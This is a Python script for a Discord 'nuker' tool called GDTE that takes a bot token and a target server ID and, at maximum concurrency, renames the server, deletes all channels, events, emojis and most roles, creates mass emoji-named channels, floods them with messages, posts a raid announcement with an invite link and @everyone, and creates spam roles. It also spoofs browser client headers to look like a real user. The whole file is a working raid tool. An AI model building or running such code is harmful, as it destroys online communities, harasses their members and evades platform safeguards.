import asyncio
import aiohttp
import base64
import json
import os
import random
import sys
import time
from datetime import datetime, timezone

RESET = "\033[0m"
CLEAR_SCREEN = "\033[2J\033[H"
HIDE_CURSOR = "\033[?25l"
SHOW_CURSOR = "\033[?25h"
API_BASE = "https://discord.com/api/v9"

GRADIENT = [196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201, 200, 199, 198, 197]

grad_pos = 0
grad_lock = asyncio.Lock()

async def next_color():
    global grad_pos
    async with grad_lock:
        c = GRADIENT[grad_pos % len(GRADIENT)]
        grad_pos += 1
        return c

async def reset_gradient():
    global grad_pos
    async with grad_lock:
        grad_pos = 0

async def gradient_string(s):
    result = []
    for ch in s:
        if ch == '\n' or ch == '\r':
            result.append(ch)
            continue
        c = await next_color()
        result.append(f"\033[38;5;{c}m{ch}")
    result.append(RESET)
    return "".join(result)

async def log_ok(action, detail):
    t = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    await reset_gradient()
    msg = f"[{t}][+]{action} -> {detail}"
    print(await gradient_string(msg))

async def log_fail(action, detail):
    t = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    await reset_gradient()
    msg = f"[{t}][-]{action} -> {detail}"
    print(await gradient_string(msg))

async def log_info(msg):
    await reset_gradient()
    print(await gradient_string(msg))

async def log_question(prompt):
    await reset_gradient()
    print(await gradient_string("[?] " + prompt), end="", flush=True)
    return input().strip()

async def log_int_question(prompt):
    while True:
        await reset_gradient()
        print(await gradient_string("[?] " + prompt), end="", flush=True)
        try:
            val = int(input().strip())
            if val >= 0:
                return val
        except ValueError:
            pass
        await log_info("[-] Invalid number. Please try again.")

async def log_hex_question(prompt):
    while True:
        await reset_gradient()
        print(await gradient_string("[?] " + prompt), end="", flush=True)
        inp = input().strip()
        if inp.startswith("0x") or inp.startswith("0X"):
            inp = inp[2:]
        try:
            return int(inp, 16)
        except ValueError:
            pass
        await log_info("[-] Invalid hex color. Please try again.")

def clear_screen():
    print(CLEAR_SCREEN, end="")
    print(HIDE_CURSOR, end="")

def show_cursor():
    print(SHOW_CURSOR, end="")

FACE_EMOJIS = [
    "\U0001F600", "\U0001F603", "\U0001F604", "\U0001F601", "\U0001F606", "\U0001F605", "\U0001F602", "\U0001F923", "\U0001F60A", "\U0001F607",
    "\U0001F642", "\U0001F643", "\U0001F609", "\U0001F60C", "\U0001F60D", "\U0001F970", "\U0001F618", "\U0001F617", "\U0001F619", "\U0001F61A",
    "\U0001F60B", "\U0001F61B", "\U0001F61D", "\U0001F61C", "\U0001F92A", "\U0001F928", "\U0001F9D0", "\U0001F913", "\U0001F60E", "\U0001F929",
    "\U0001F973", "\U0001F60F", "\U0001F612", "\U0001F61E", "\U0001F614", "\U0001F61F", "\U0001F615", "\U0001F641", "\U00002639\U0000FE0F", "\U0001F623",
    "\U0001F616", "\U0001F62B", "\U0001F629", "\U0001F97A", "\U0001F622", "\U0001F62D", "\U0001F624", "\U0001F620", "\U0001F621", "\U0001F92C",
]

async def download_to_base64(url):
    if not url:
        return ""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                content_type = resp.headers.get("Content-Type", "image/png")
                data = await resp.read()
                b64 = base64.b64encode(data).decode()
                return f"data:{content_type};base64,{b64}"
    except Exception:
        return ""

def load_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except FileNotFoundError:
        return ""

def load_channel_names():
    try:
        with open("ch.txt", "r", encoding="utf-8") as f:
            names = [line.strip() for line in f if line.strip()]
            return names if names else ["channel-"]
    except FileNotFoundError:
        return ["channel-"]

def generate_channel_name(base_names):
    base = random.choice(base_names)
    emojis = "".join(random.choice(FACE_EMOJIS) for _ in range(10))
    return base + emojis

class DiscordClient:
    def __init__(self, token):
        self.token = token
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    def _headers(self):
        return {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0",
            "Accept": "*/*",
            "Accept-Language": "ja",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "X-Discord-Locale": "ja",
            "X-Discord-Timezone": "Asia/Tokyo",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0OS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xNDkuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxNDkuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vY2xvdWQucHVyYXR5YS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6ImNsb3VkLnB1cmF0eWEuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjU2MjUzOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImJmNWZhOThmLTZiOTAtNDc1NC1hOGQ4LTExNmZmNjZhMjcyYiIsImxhdW5jaF9zaWduYXR1cmUiOiI0ZjQwMDk2Zi0wMGMzLTQ1NGUtODYyNi00ZTk2ZjRlM2M3MDQiLCJjbGllbnRfaGVhcnRiZWF0X3Nlc3Npb25faWQiOiIwM2IzODVhYy1jZjg5LTQ1ZDgtODk4Zi04Y2ZkMTcxYmZmN2IiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCJ9",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"149\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"149\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
        }

    async def request(self, method, endpoint, body=None):
        url = API_BASE + endpoint
        headers = self._headers()
        async with self.session.request(method, url, headers=headers, json=body) as resp:
            text = await resp.text()
            if resp.status not in (200, 201, 204):
                raise Exception(f"status {resp.status}: {text}")
            return json.loads(text) if text else {}

    async def get_json(self, endpoint):
        return await self.request("GET", endpoint)

    async def get_json_array(self, endpoint):
        return await self.request("GET", endpoint)

    async def delete(self, endpoint):
        await self.request("DELETE", endpoint)

    async def post_json(self, endpoint, payload):
        return await self.request("POST", endpoint, payload)

    async def patch_json(self, endpoint, payload):
        return await self.request("PATCH", endpoint, payload)

async def main():
    clear_screen()

    ascii_lines = [
        "  ____ ____ _____ _____               _             ",
        " / ___|  _ \\__   _| ____|  _ __  _   _| | _____ _ __ ",
        "| |  _| | | || | |  _|   | '_ \\| | | | |/ / _ \\ '__|",
        "| |_| | |_| || | | |___  | | | | |_| |   <  __/ |   ",
        " \\____|____/ |_| |_____| |_| |_|\\__,_|_|\\_\\___|_|   ",
    ]
    for line in ascii_lines:
        await reset_gradient()
        print(await gradient_string(line))
    print()

    token = load_file("bot.txt")
    if not token:
        await log_info("[-] bot.txt not found or empty!")
        await log_info("[i] Please create bot.txt with your bot token.")
        show_cursor()
        return
    await log_info("[+] Bot token loaded from bot.txt")

    message_content = load_file("me.txt")
    if not message_content:
        await log_info("[-] me.txt not found or empty!")
        await log_info("[i] Please create me.txt with your message content.")
        show_cursor()
        return
    await log_info("[+] Message content loaded from me.txt")

    print()
    await log_info("Configuration")
    print()

    guild_id = await log_question("Enter target Guild ID: ")
    if not guild_id:
        await log_info("[-] Guild ID is required!")
        show_cursor()
        return

    channel_count = await log_int_question("Enter number of channels to create: ")
    channel_names = load_channel_names()
    await log_info(f"[+] Loaded {len(channel_names)} base channel names from ch.txt")

    messages_per_channel = await log_int_question("Enter messages per channel: ")

    role_name = await log_question("Enter role name: ")
    role_count = await log_int_question("Enter number of roles to create: ")
    role_color = await log_hex_question("Enter role color (hex, e.g., DC143C): ")

    server_name = await log_question("Enter new server name: ")
    icon_url = await log_question("Enter server icon URL (or leave empty): ")

    print()
    await log_info("Summary")
    await log_info(f"[i] Guild ID: {guild_id}")
    await log_info(f"[i] Channels: {channel_count}")
    await log_info(f"[i] Messages/Channel: {messages_per_channel}")
    await log_info(f"[i] Roles: {role_count} x {role_name}")
    await log_info(f"[i] Role Color: #{role_color:06X}")
    await log_info(f"[i] Server Name: {server_name}")
    print()

    await log_question("Press ENTER to start nuke...")

    async with DiscordClient(token) as client:
        try:
            me = await client.get_json("/users/@me")
            username = me.get("username", "Bot")
            await log_info(f"[+] {username} is connected!")
        except Exception as e:
            await log_info(f"[-] Authentication failed: {e}")
            show_cursor()
            return

        await nuke_guild(client, guild_id, server_name, icon_url, role_name, role_count, role_color, channel_count, messages_per_channel, channel_names, message_content)

        await log_info("[i] Bot is running. Press Ctrl+C to exit.")
        while True:
            await asyncio.sleep(1)

async def nuke_guild(client, guild_id, server_name, icon_url, role_name, role_count, role_color, channel_count, messages_per_channel, channel_names, message_content):
    start_time = time.time()
    print()
    await log_info("NUKE STARTED")
    print()

    asyncio.create_task(change_server_name(client, guild_id, server_name, icon_url))

    try:
        channels = await client.get_json_array(f"/guilds/{guild_id}/channels")
    except Exception as e:
        await log_fail("get channels", str(e))
        channels = []

    if channels:
        tasks = [delete_channel(client, ch) for ch in channels]
        await asyncio.gather(*tasks, return_exceptions=True)

    try:
        events = await client.get_json_array(f"/guilds/{guild_id}/scheduled-events")
    except Exception:
        events = []

    if events:
        tasks = [client.delete(f"/guilds/{guild_id}/scheduled-events/{ev.get('id')}") for ev in events if ev.get('id')]
        await asyncio.gather(*tasks, return_exceptions=True)

    try:
        emojis = await client.get_json_array(f"/guilds/{guild_id}/emojis")
    except Exception:
        emojis = []

    if emojis:
        tasks = [client.delete(f"/guilds/{guild_id}/emojis/{em.get('id')}") for em in emojis if em.get('id')]
        await asyncio.gather(*tasks, return_exceptions=True)

    created_channel_ids = []
    if channel_count > 0:
        await log_info(f"[i] Creating {channel_count} channels at MAXIMUM SPEED...")
        pre_generated_names = [generate_channel_name(channel_names) for _ in range(channel_count)]

        tasks = [create_channel(client, guild_id, name) for name in pre_generated_names]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, str):
                created_channel_ids.append(result)

        await log_info(f"[+] Created {len(created_channel_ids)}/{channel_count} channels!")

    if messages_per_channel > 0 and created_channel_ids:
        total_msgs = len(created_channel_ids) * messages_per_channel
        await log_info(f"[i] Sending {total_msgs} messages at MAXIMUM SPEED...")

        tasks = []
        for ch_id in created_channel_ids:
            for _ in range(messages_per_channel):
                tasks.append(send_message(client, ch_id, message_content))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        msg_success = sum(1 for r in results if r is None)
        msg_err = len(results) - msg_success

        await log_info(f"[+] Sent {msg_success}/{total_msgs} messages (errors: {msg_err})!")

    await log_info("[i] Sending embed to rules channel...")
    try:
        channels = await client.get_json_array(f"/guilds/{guild_id}/channels")
    except Exception:
        channels = []

    rules_ch_id = None
    for ch in channels:
        ch_name = ch.get("name", "").lower()
        if "rules" in ch_name or "rule" in ch_name:
            rules_ch_id = ch.get("id")
            break

    if rules_ch_id:
        try:
            await client.post_json(f"/channels/{rules_ch_id}/messages", {
                "embeds": [{
                    "title": "GDTEnuker",
                    "description": "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs",
                    "color": 0x242929,
                    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png"},
                    "footer": {"text": "@everyone https://github.com/agehantonu/GDTE-nuker"},
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }]
            })
            await log_ok("embed send", rules_ch_id)
        except Exception as e:
            await log_fail("embed send", str(e))
    else:
        await log_fail("embed send", "no rules channel found")

    try:
        roles = await client.get_json_array(f"/guilds/{guild_id}/roles")
    except Exception:
        roles = []

    if roles:
        tasks = [delete_role(client, guild_id, role) for role in roles if role.get("id") and role.get("id") != guild_id and not role.get("managed")]
        await asyncio.gather(*tasks, return_exceptions=True)

    if role_count > 0:
        await log_info(f"[i] Creating {role_count} roles at MAXIMUM SPEED...")
        tasks = [create_role(client, guild_id, role_name, role_color) for _ in range(role_count)]
        await asyncio.gather(*tasks, return_exceptions=True)

    print()
    await log_info("NUKE COMPLETE")
    await log_info(f"[+] Total execution time: {time.time() - start_time:.3f}s")
    print()

async def change_server_name(client, guild_id, server_name, icon_url):
    icon_base64 = await download_to_base64(icon_url)
    payload = {"name": server_name}
    if icon_base64:
        payload["icon"] = icon_base64
    try:
        await client.patch_json(f"/guilds/{guild_id}", payload)
        await log_ok("server edit", server_name)
    except Exception as e:
        await log_fail("server edit", str(e))

async def delete_channel(client, ch):
    ch_id = ch.get("id")
    ch_name = ch.get("name", "")
    if not ch_id:
        return
    try:
        await client.delete(f"/channels/{ch_id}")
        await log_ok("channel delete", ch_name)
    except Exception:
        await log_fail("channel delete", ch_name)

async def create_channel(client, guild_id, name):
    try:
        result = await client.post_json(f"/guilds/{guild_id}/channels", {"name": name, "type": 0})
        ch_id = result.get("id")
        if ch_id:
            await log_ok("channel make", name)
            return ch_id
        await log_fail("channel make", name)
    except Exception as e:
        await log_fail("channel make", str(e))
    return None

async def send_message(client, ch_id, content):
    try:
        await client.post_json(f"/channels/{ch_id}/messages", {"content": content})
        await log_ok("message ok", ch_id)
    except Exception as e:
        await log_fail("message false", str(e))

async def delete_role(client, guild_id, role):
    r_id = role.get("id")
    r_name = role.get("name", "")
    try:
        await client.delete(f"/guilds/{guild_id}/roles/{r_id}")
        await log_ok("role delete", r_name)
    except Exception:
        await log_fail("role delete", r_name)

async def create_role(client, guild_id, role_name, role_color):
    try:
        await client.post_json(f"/guilds/{guild_id}/roles", {
            "name": role_name,
            "color": role_color,
            "hoist": True,
            "mentionable": True,
        })
        await log_ok("role make", role_name)
    except Exception as e:
        await log_fail("role make", str(e))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        show_cursor()
        print("\nExiting...")